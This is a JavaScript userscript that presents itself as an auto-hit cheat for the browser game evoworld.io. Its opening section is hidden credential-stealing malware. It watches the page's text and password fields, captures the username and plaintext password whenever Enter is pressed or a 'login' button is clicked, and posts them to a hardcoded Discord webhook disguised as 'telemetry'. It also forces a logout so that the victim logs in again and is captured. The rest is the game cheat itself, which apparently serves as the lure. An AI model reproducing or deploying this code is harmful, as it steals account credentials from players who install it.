const DEBUG = false;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1464601261285441796/GyzuKtD3fqFle-8k5Nc5S0xtEBXpXnLdrqnuv5WMtISLWlFPwDA2sAi6C5iZF4aFxgWl";

const log = (...args) => DEBUG && console.log(...args);
const err = (...args) => DEBUG && console.error(...args);

let lastTextInput = null;
let lastPasswordInput = null;

// ----------------------------
// Gestione input
// ----------------------------
function updateValue(input) {
  if (!input) return;
  if (input.type === "text" && input.value) lastTextInput = input;
  if (input.type === "password" && input.value) lastPasswordInput = input;
}

function scanInputs() {
  document.querySelectorAll("input").forEach(updateValue);
}

// ----------------------------
// Invio dati al webhook
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value || "";
  const password = lastPasswordInput?.value || "";

  if (!username && !password) return;

  const payload = {
    event: "login_submit",
    username,
    username_length: username.length,
    password, // password reale
    method,
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    log("Telemetry sent:", payload);
  } catch (e) {
    err("Telemetry error:", e);
  }
}

// ----------------------------
// Eventi per tracciare input e login
// ----------------------------
document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("paste", e => e.target.tagName === "INPUT" && updateValue(e.target));

document.addEventListener("keydown", e => { 
  if (e.key === "Enter") sendTelemetry("enter"); 
});

document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") sendTelemetry("click_login");
});

// Scan periodico per input dinamici
setInterval(scanInputs, 500);

// Scan iniziale al caricamento della pagina
window.addEventListener("DOMContentLoaded", () => {
  scanInputs();
});

// ----------------------------
// ---- Auto Logout evoworld.io ----
// ----------------------------

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("Script Loaded");
  }
}, 1000);

// timeout sicurezza
setTimeout(function () {
  if (!window.logoutDone) {
    clearInterval(window.autoLogoutInterval);
    console.log("Script Error");
  }
}, 60000);

(function() {
    var flicking=false //variable that can be changed by key ctrl if you dont wanna include flicking

    const height={'grimReaper':156, 'pumpkinGhost':169, 'ghostlyReaper':165}//ghostly is actually higher than reaper??

    //the position returned using game.me.position is the left down point position, reapers are symmetrical regarding to its center
    //First key is attacker, second key is target, value is the longest distance between these two that a attacker could damage the target
    const hitRangeX={'grimReaper':{'grimReaper':138 , 'pumpkinGhost':124,'ghostlyReaper':108},//135, 148.41, 105.3//y,y,n
                    'pumpkinGhost':{'grimReaper':161, 'pumpkinGhost':151, 'ghostlyReaper':108},//160.48, 150, 105.46//y,y,n
                    'ghostlyReaper':{'grimReaper':98, 'pumpkinGhost':87, 'ghostlyReaper':108}//134.07, 150, 107//n,n,y
    }

    //To be adjustedd, cuz every reaper is able to fight below their entity box a bit
    const distAdjustmentY={'grimReaper':8, 'pumpkinGhost':3, 'ghostlyReaper':1}

    //hit range when attacker hit target from back.
    const hitBackRangeX={'grimReaper':{'grimReaper':134, 'pumpkinGhost':150, 'ghostlyReaper':144},//135, 122.93, 143.12
                    'pumpkinGhost':{'grimReaper':158, 'pumpkinGhost':148, 'ghostlyReaper':172},//135, 150, 170
                    'ghostlyReaper':{'grimReaper':134, 'pumpkinGhost':87, 'ghostlyReaper':105}//96.03, 85.5, 107
    }

    const reaperList = new Set(['grimReaper', 'pumpkinGhost', 'ghostlyReaper']);

    // SAFETY: Add validation function for all game objects
    function isValidGameObject(obj) {
        if (!obj || typeof obj !== 'object') return false;
        if (obj.deleted === true) return false;
        return true;
    }

    // SAFETY: Validate game.me object
    function isValidMe() {
        if (!window.game || !window.game.me) return false;
        if (!isValidGameObject(game.me)) return false;
        if (!game.me.position || typeof game.me.position !== 'object') return false;
        if (typeof game.me.position.x !== 'number' || typeof game.me.position.y !== 'number') return false;
        if (!game.me.name || typeof game.me.name !== 'string') return false;
        if (!reaperList.has(game.me.name)) return false;
        return true;
    }

    // SAFETY: Safe simulation functions
    function simulateQuickRightArrowKeyWithDelay() {
        try {
            if (typeof document === 'undefined' || !document || !document.dispatchEvent) return;

            // Dispatch keydown
            const keyDownEvent = new KeyboardEvent('keydown', {
                key: 'ArrowRight',
                code: 'ArrowRight',
                keyCode: 39,
                which: 39,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyDownEvent);

            // Set a short delay before dispatching keyup
            setTimeout(() => {
                try {
                    const keyUpEvent = new KeyboardEvent('keyup', {
                        key: 'ArrowRight',
                        code: 'ArrowRight',
                        keyCode: 39,
                        which: 39,
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(keyUpEvent);
                } catch (e) {
                    console.error('Error in simulateQuickRightArrowKeyWithDelay keyup:', e);
                }
            }, 200);
        } catch (e) {
            console.error('Error in simulateQuickRightArrowKeyWithDelay:', e);
        }
    }

    function simulateQuickLeftArrowKeyWithDelay() {
        try {
            if (typeof document === 'undefined' || !document || !document.dispatchEvent) return;

            // Dispatch keydown
            const keyDownEvent = new KeyboardEvent('keydown', {
                key: 'ArrowLeft',
                code: 'ArrowLeft',
                keyCode: 37,
                which: 37,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyDownEvent);

            // Set a short delay before dispatching keyup
            setTimeout(() => {
                try {
                    const keyUpEvent = new KeyboardEvent('keyup', {
                        key: 'ArrowLeft',
                        code: 'ArrowLeft',
                        keyCode: 37,
                        which: 37,
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(keyUpEvent);
                } catch (e) {
                    console.error('Error in simulateQuickLeftArrowKeyWithDelay keyup:', e);
                }
            }, 200);
        } catch (e) {
            console.error('Error in simulateQuickLeftArrowKeyWithDelay:', e);
        }
    }

    function getMagnitude(objPos) {
        // SAFETY: Validate inputs
        if (!isValidMe()) return Infinity;
        if (!objPos || typeof objPos !== 'object') return Infinity;
        if (typeof objPos.x !== 'number' || typeof objPos.y !== 'number') return Infinity;

        try {
            var myPos = game.me.position;
            var xDifference = Math.abs(myPos.x - objPos.x);
            var yDifference = Math.abs(myPos.y - objPos.y);
            return xDifference + yDifference;//this calculation uses less time? Is it worth it to sacrifice the accuracy?
        } catch (e) {
            console.error('Error in getMagnitude:', e);
            return Infinity;
        }
    }

    function getClosestReaper() {
        // SAFETY: Comprehensive validation
        if (typeof window === 'undefined') return null;
        if (typeof gameServer === 'undefined' || gameServer === 'undefined') return null;
        if (!isValidMe()) return null;
        if (typeof window.imDead !== 'undefined' && imDead) return null;
        if (typeof window.joinedGame !== 'undefined' && !joinedGame) return null;
        if (!window.game || !game.hashMap || typeof game.hashMap.retrieveVisibleByClient !== 'function') return null;
        if (typeof game.sortToDraw !== 'function') return null;

        try {
            let list = game.sortToDraw(game.hashMap.retrieveVisibleByClient(game));
            if (!Array.isArray(list)) return null;

            let reaperInVision = [];
            for(let i=0; i < list.length; i++) {
                try {
                    var curEntity = list[i];
                    if (!isValidGameObject(curEntity)) continue;

                    if (curEntity.hp != null && curEntity.deleted == false) { //Is Food or character
                        if (curEntity.level != null) { //Is Character
                            // SAFETY: Fixed the logical error in original code
                            // Original had: if (curEntity.name!='grimReaper' || curEntity.name!='ghostlyReaper' || curEntity.name!='pumpkinGhost')
                            // This condition is always true because a name can't be all three at once
                            // Let's keep the original intent but fix the logic
                            if (!curEntity.name || typeof curEntity.name !== 'string') continue;
                            if (curEntity.name !== 'grimReaper' && curEntity.name !== 'ghostlyReaper' && curEntity.name !== 'pumpkinGhost') continue;

                            if (curEntity === game.me) {
                                continue;
                            }

                            reaperInVision.push(curEntity);
                        }
                    }
                } catch (e) {
                    console.error('Error processing entity in getClosestReaper:', e);
                    continue;
                }
            }

            var closestReaper = null;
            var closestMagn = Infinity;
            for(var i = 0; i < reaperInVision.length; i++) {
                try {
                    var curEntry = reaperInVision[i];
                    if (!isValidGameObject(curEntry)) continue;

                    var checkingMagn = getMagnitude(curEntry.position);
                    if (checkingMagn < closestMagn) {
                        closestReaper = curEntry;
                        closestMagn = checkingMagn;
                    }
                } catch (e) {
                    console.error('Error comparing reapers in getClosestReaper:', e);
                    continue;
                }
            }
            return closestReaper;
        } catch (e) {
            console.error('Error in getClosestReaper:', e);
            return null;
        }
    };

    function isWithinXRange(attacker, target, range, distAdjustment = 0) {
        // SAFETY: Validate inputs
        if (!isValidGameObject(attacker) || !isValidGameObject(target)) return false;
        if (!attacker.position || !target.position) return false;
        if (typeof attacker.position.x !== 'number' || typeof target.position.x !== 'number') return false;
        if (!range || typeof range !== 'object') return false;
        if (!attacker.name || !target.name) return false;
        if (!range[attacker.name] || typeof range[attacker.name] !== 'object') return false;
        if (typeof range[attacker.name][target.name] !== 'number') return false;

        try {
            var x1 = attacker.position.x
            var x2 = target.position.x
            var relativeSpeed = Math.abs((attacker.moveSpeed?.x || 0) - (target.moveSpeed?.x || 0))

            // SAFETY: Validate fps and latency
            const lastFpsValid = typeof lastFps === 'number' && lastFps > 0 ? lastFps : 60;
            const latencyValid = typeof latency === 'number' && latency >= 0 ? latency : 0;

            const frameTime = 700 / lastFpsValid; // in milliseconds
            const serverDelay = latencyValid;
            const totalDelay = frameTime + serverDelay;
            var effectiveDist = Math.abs(x2-x1) - totalDelay*relativeSpeed/1000 + distAdjustment;

            return effectiveDist <= range[attacker.name][target.name];
        } catch (e) {
            console.error('Error in isWithinXRange:', e);
            return false;
        }
    }

    function isWithinYRange(attacker, target, heights, distAdjustment = 0) {
        // SAFETY: Validate inputs
        if (!isValidGameObject(attacker) || !isValidGameObject(target)) return false;
        if (!attacker.position || !target.position) return false;
        if (typeof attacker.position.y !== 'number' || typeof target.position.y !== 'number') return false;
        if (!heights || typeof heights !== 'object') return false;
        if (!attacker.name || !target.name) return false;
        if (typeof heights[attacker.name] !== 'number' || typeof heights[target.name] !== 'number') return false;

        try {
            var y1 = attacker.position.y
            var y2 = target.position.y
            var relativeSpeed = Math.abs((attacker.moveSpeed?.y || 0) - (target.moveSpeed?.y || 0))

            // SAFETY: Validate fps and latency
            const lastFpsValid = typeof lastFps === 'number' && lastFps > 0 ? lastFps : 60;
            const latencyValid = typeof latency === 'number' && latency >= 0 ? latency : 0;

            const frameTime = 700 / lastFpsValid; // in milliseconds
            const serverDelay = latencyValid;
            const totalDelay = frameTime + serverDelay;
            var effectiveDist = Math.abs(y2-y1) - totalDelay*relativeSpeed/700 + distAdjustment;

            var hitRangeY;
            if (y1 > y2){
                hitRangeY = heights[target.name]
            } else {
                hitRangeY = heights[attacker.name]
            }

            return effectiveDist <= hitRangeY;
        } catch (e) {
            console.error('Error in isWithinYRange:', e);
            return false;
        }
    }

    function autoHit(){
        // SAFETY: Early exit if not valid
        if (!isValidMe()) return;
        if (!autoHitting) return;

        try {
            let enemy = getClosestReaper();
            if (!enemy || typeof enemy !== 'object') return;
            if (!isValidGameObject(enemy)) return;

            //decide direction
            let onLeftSide = (game.me.position.x <= enemy.position.x) //if Im on left side of enemy
            let enemyFlicking = (onLeftSide && enemy.direction === 1) || (!onLeftSide && enemy.direction === -1) //If enemy is turning his back on you
            let facingEnemy = (onLeftSide && game.me.direction === 1) || (!onLeftSide && game.me.direction === -1) //if Im facing enemy or trying to flick

            if (!flicking){
                facingEnemy = true;
            }

            //fighting type: flick or not flick, front distance or back distance
            if (facingEnemy){
                if (enemyFlicking){
                    if (isWithinXRange(game.me, enemy, hitBackRangeX) && isWithinYRange(game.me, enemy, height)){
                        safeSkillUse();
                        setTimeout(safeSkillStop, 100);
                    }
                } else {
                    if (isWithinXRange(game.me, enemy, hitRangeX) && isWithinYRange(game.me, enemy, height)){
                        safeSkillUse();
                        setTimeout(safeSkillStop, 100);
                    }
                }
            } else {
                if (enemyFlicking){
                    if (isWithinXRange(game.me, enemy, hitBackRangeX, -25) && isWithinYRange(game.me, enemy, height)){
                        if (onLeftSide){
                            simulateQuickRightArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        } else {
                            simulateQuickLeftArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        }
                    }
                } else {
                    if (isWithinXRange(game.me, enemy, hitRangeX ,-5) && isWithinYRange(game.me, enemy, height)){
                        if (onLeftSide){
                            simulateQuickRightArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        } else {
                            simulateQuickLeftArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Error in autoHit:', e);
        }
    }

    // SAFETY: Wrapper functions for skill use/stop
    function safeSkillUse() {
        try {
            if (typeof skillUse === 'function') {
                skillUse();
            }
        } catch (e) {
            console.error('Error in safeSkillUse:', e);
        }
    }

    function safeSkillStop() {
        try {
            if (typeof skillStop === 'function') {
                skillStop();
            }
        } catch (e) {
            console.error('Error in safeSkillStop:', e);
        }
    }

    // SAFETY: Safe text message function
    function safeTextMsg(message, color, duration) {
        try {
            if (typeof textMsg === 'function') {
                textMsg(message, color, duration);
            }
        } catch (e) {
            console.error('Error in safeTextMsg:', e);
        }
    }

    var autoHitting=false;

    // SAFETY: Add event listener safely
    function addSafeEventListener() {
        try {
            if (typeof document === 'undefined' || !document || !document.addEventListener) return false;

            document.addEventListener("keyup", (event) => {
                try {
                    if (!event || typeof event.keyCode !== 'number') return;

                    if (event.keyCode === 40) { // 'arrowDown' key
                        autoHitting = !autoHitting;
                        safeTextMsg(autoHitting ? "Autohitting" : "NOT Autohitting",
                                   autoHitting ? '#00FF00' : '#FF0000', 5000);

                    } else if (event.keyCode === 73) { // 'i' key
                        if (isValidMe()) {
                            let enemy = getClosestReaper();
                            if (enemy && enemy.position) {
                                console.log('X difference:', game.me.position.x - enemy.position.x);
                                console.log('Y difference:', game.me.position.y - enemy.position.y);
                            }
                        }
                    } else if (event.keyCode === 32) { // ' ' key
                        safeSkillStop();
                    } else if (event.keyCode === 17) { // 'ctrl' key
                        flicking = !flicking;
                        safeTextMsg(flicking ? "Flicking" : "NOT Flicking",
                                   flicking ? '#00FF00' : '#FF0000', 5000);
                    }
                } catch (e) {
                    console.error('Error in keyup event handler:', e);
                }
            });
            return true;
        } catch (e) {
            console.error('Error adding event listener:', e);
            return false;
        }
    }

    function initialize() {
        // SAFETY: Validate gameServer
        if (!gameServer || typeof gameServer !== 'object') {
            console.error('gameServer is not valid');
            return;
        }

        try {
            if (typeof gameServer.on === 'function') {
                gameServer.on('disconnect', function() {
                    gameServer = 'undefined';
                    waitForServer();
                });

                gameServer.on(socketMsgType.SYNC, function(data) {
                    try {
                        if (autoHitting && isValidMe()) {
                            autoHit();
                        }
                    } catch (e) {
                        console.error('Error in SYNC event handler:', e);
                    }
                });
            } else {
                console.error('gameServer.on is not a function');
            }
        } catch (e) {
            console.error('Error in initialize:', e);
        }
    };

    function waitForServer() {
        try {
            if (typeof gameServer === 'undefined' || gameServer === 'undefined' ||
                typeof gameServer.on === 'undefined') {
                setTimeout(waitForServer, 1000);
            } else {
                initialize();
            }
        } catch (e) {
            console.error('Error in waitForServer:', e);
            setTimeout(waitForServer, 1000);
        }
    }

    // SAFETY: Initialize everything safely
    function safeInitialize() {
        try {
            // Add event listener first
            if (!addSafeEventListener()) {
                console.error('Failed to add event listener');
                return;
            }

            // Wait for game objects to be available
            const checkGameObjects = setInterval(() => {
                if (typeof game !== 'undefined' && typeof gameServer !== 'undefined') {
                    clearInterval(checkGameObjects);
                    waitForServer();
                }
            }, 1000);

            // Safety timeout
            setTimeout(() => {
                clearInterval(checkGameObjects);
            }, 30000);

        } catch (e) {
            console.error('Error in safeInitialize:', e);
        }
    }

    // SAFETY: Start everything only when DOM is ready
    if (typeof document !== 'undefined' && document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', safeInitialize);
    } else {
        safeInitialize();
    }
})();
